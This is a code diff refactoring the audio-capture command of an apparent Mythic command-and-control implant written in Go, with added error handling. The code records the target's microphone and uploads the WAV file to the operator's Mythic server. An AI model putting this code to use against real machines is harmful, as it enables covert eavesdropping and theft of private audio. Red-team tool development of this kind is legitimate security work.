@@ -192,11 +192,13 @@ func (c *AudioCaptureCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorf("No audio data captured — microphone may not be active")
 	}
 
-	// Build WAV file
-	wavHeader := buildWAVHeader(len(collectedData), params.SampleRate, params.Channels, bitsPerSample)
-	wavData := append(wavHeader, collectedData...)
+	return audioUploadWAV(collectedData, params, bitsPerSample, startTime, task)
+}
 
-	// Upload WAV file to Mythic
+func audioUploadWAV(data []byte, params audioCaptureParams, bitsPerSample int, startTime time.Time, task structs.Task) structs.CommandResult {
+	wavHeader := buildWAVHeader(len(data), params.SampleRate, params.Channels, bitsPerSample)
+	wavData := append(wavHeader, data...)
+
 	uploadMsg := structs.SendFileToMythicStruct{}
 	uploadMsg.Task = &task
 	uploadMsg.IsScreenshot = false
@@ -208,7 +210,6 @@ func (c *AudioCaptureCommand) Execute(task structs.Task) structs.CommandResult {
 
 	task.Job.SendFileToMythic <- uploadMsg
 
-	// Wait for transfer
 	for {
 		select {
 		case <-uploadMsg.FinishedTransfer:
@@ -220,7 +221,10 @@ func (c *AudioCaptureCommand) Execute(task structs.Task) structs.CommandResult {
 				DataSize:    len(wavData),
 				DeviceUsed:  "default (WAVE_MAPPER)",
 			}
-			output, _ := json.Marshal(result)
+			output, err := json.Marshal(result)
+			if err != nil {
+				return errorf("failed to marshal result: %v", err)
+			}
 			return successResult(string(output))
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
